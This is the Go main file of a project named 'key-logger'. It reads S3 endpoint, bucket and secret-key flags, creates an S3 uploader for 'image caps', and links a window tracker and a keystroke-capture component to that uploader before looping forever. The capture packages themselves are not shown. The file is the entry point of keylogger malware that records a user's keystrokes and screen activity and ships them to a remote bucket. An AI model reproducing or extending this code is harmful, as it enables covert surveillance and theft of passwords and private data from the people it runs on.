package main

import (
	"flag"
	"os"

	gklog "github.com/go-kit/kit/log"

	"key-logger/pkg/key"
	s32 "key-logger/pkg/s3"
	"key-logger/pkg/window"
)

func main() {

	logger := gklog.NewLogfmtLogger(gklog.NewSyncWriter(os.Stdout))

	endpoint := flag.String("s3-endpoint", "", "s3 url (without bucket)")
	bucketName := flag.String("bucket", "", "s3bucket name for image caps")
	accessKeyId := flag.String("accessKey", "", "s3 access key Id")
	secretKey := flag.String("secretKey", "", "s3 secret key")
	flag.Parse()

	s3 := s32.New(*endpoint, *accessKeyId, *secretKey, *bucketName)

	w := window.New(logger, s3)
	_ = key.New(logger, w)

	for {
		select {}
	}

	//go getActiveWindowInfo(winChan, processChan)
	//
	//
	//
	//go cb.updateActiveWindow(winChan, processChan)
	//go getLastInputInfoLoop()

}
